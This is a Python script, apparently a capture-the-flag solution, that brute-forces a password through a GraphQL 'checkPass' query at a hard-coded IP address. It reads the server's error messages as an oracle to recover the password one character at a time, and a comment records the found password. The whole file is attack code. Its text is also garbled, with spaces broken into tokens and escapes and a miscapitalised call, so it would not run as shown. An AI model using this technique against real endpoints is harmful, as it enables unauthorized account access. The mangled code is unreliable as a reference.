import  requests 
import  string 
import  json 
import  re 
from  time  import  sleep

url  =  "http://101.71.29.5:10037/graphql" 
s  =  string . ascii_letters  +  string . digits  +  "{}"

password  =  " \ u8981 \ u6709 \ u4e86 \ u4ea7 \ u4e8e \ u4e86 \ u4e3b \ u65b9 \ u4ee5 \ u5b9a \ u4eba \ u65b9 \ u4e8e \ u6709 \ u6210 \ u4ee5 \ u4ed6 \ u7684 \ u7231 \ u7231 " 
#Password = "\ u5230 \ u5e74 \ u79cd \ u6210 \ u5230 \ u5b9a \ u8fc7 \ u6210 \ u4e2a \ u4ed6 \ u6210 \ u4f1a \ u4e3a \ u800c \ u65f6 \ u65b9 \ u4e0a \ u800c \ u5230 \ u5e74ua \ u5230 \ u5e74 \ u5230 \ u4e3a \ u800c \ u5230 \ u53ef \ u5bf9 \ u65b9 \ u751f \ u800c \ u4ee5 \ u5e74 \ u4e3a \ u6709 \ u5230 \ u6210 \ u4e0a \ u53ef \ u6211 \ u884c \ u5230 \ u4e6 \ u7684 \ u7684 \ u7684 \ u7231 " 
find_password  =  " " 
change_password  =  " " # HappY4Gr4phQL 
pass_list  =  password . split ( " \ u " ) [ 1 :] 
count =  0 
query  =  { "query" : "{ \ n   checkPass (memoId: 1, password: \" % s \ " ) \ n } \ n " } 
query  =  json . Dumps ( query ) 
headers  =  { 
    "Content-Type " : " application / json " 
}

while  find_password  ! =  password : 
    possible_list  =  [] 
    end  =  0 
    for  i  in  s : 
        payload  =  query  %  ( change_password  +  i ) 
        s1  =  requests . Session () 
        r  =  s1 . post ( url , headers =  headers , data = payload ) 
        sleep ( 0.1 ) 
        message =  str ( re . findall ( "'(. *)' not" , r . text ) [ 0 ]) 
        message_list  =  message . split ( "\ u" ) [ 1 :] 
        if  ( message_list [ count ]  ==  pass_list [ count ])  and  ( message_list [ count  +  1 ]  ==  pass_list [ count  +  1 ])  and  (message_list [ count  +  2 ]  ==  pass_list [ count  +  2 ]): 
            change_password  =  change_password  +  i 
            end  =  1 
            break 
        elif  message_list [ count ]  ==  pass_list [ count ]: 
            possible_list . append ( i ) 
    if  end  ==  1 : 
        print  change_password 
        break 
    #print possible_list 
    count  = count  +  1 
    poss1_list  =  [] 
    for  j  in  possible_list : 
        for  z  in  s : 
            payload  =  query  %  ( change_password + j + z ) 
            s1  =  requests . Session () 
            r1  =  s1 . post ( url ,  headers = headers ,  data = payload ) 
            sleep ( 0.1 )
            message  =  str ( re . findall ( "'(. *)' not" ,  r1 . text ) [ 0 ]) 
            message_list  =  message . split ( "\ u" ) [ 1 :] 
            if  ( message_list [ count ]  ==  pass_list [ count ])  and  ( message_list [ count  +  1 ]  ==  pass_list [ count  +  1 ]) and  ( message_list [ count  +  2 ]  ==  pass_list [ count  +  2 ]): 
                end  =  1 
                break 
            elif  message_list [ count ]  ==  pass_list [ count ]: 
                poss1_list . append ( z ) 
        if  len ( poss1_list )  ! =  0 : 
            change_password  =  change_password  +  j 
            if  end  ==  1: 
                change_password  =  change_password  +  z 
            find_password  =  find_password  +  "\ u"  +  pass_list [ count  -  1 ] 
            break 
        if  end  ==  1 : 
            break 
    if  end  ==  1 : 
        print  change_password 
        break 
    #print poss1_list 
    if  len ( poss1_list )  ==  1 : 
        print  change_password 
        continue 
    else : 
        count  = count  +  1 
        for  k  in  poss1_list : 
            for  m  in  s : 
                payload  =  query  %  ( change_password  +  k  +  m ) 
                s1  =  requests . Session () 
                r2  =  s1 . post ( url , headers = headers , data = payload ) 
                sleep ( 0.1 ) 
                message  =  str (re . findall ( "'(. *)' not" ,  r2 . text ) [ 0 ]) 
                message_list  =  message . split ( "\ u" ) [ 1 :] 
                if  ( message_list [ count ]  ==  pass_list [ count ])  and  ( message_list [ count  +  1 ]  ==  pass_list [ count  +  1 ]): 
                    change_password  =  change_password +  k  +  m 
                    find_password  =  find_password  +  "\ u"  +  pass_list [ count  -  1 ]  +  "\ u"  +  pass_list [ count ]  +  "\ u"  +  pass_list [ count  +  1 ] 
                    end  =  1 
                    break 
            if  end  ==  1 : 
                break 
        count  =  count  +  2 
        print  change_password 
        print  find_password
        
        # password ran out HappY4Gr4phQL
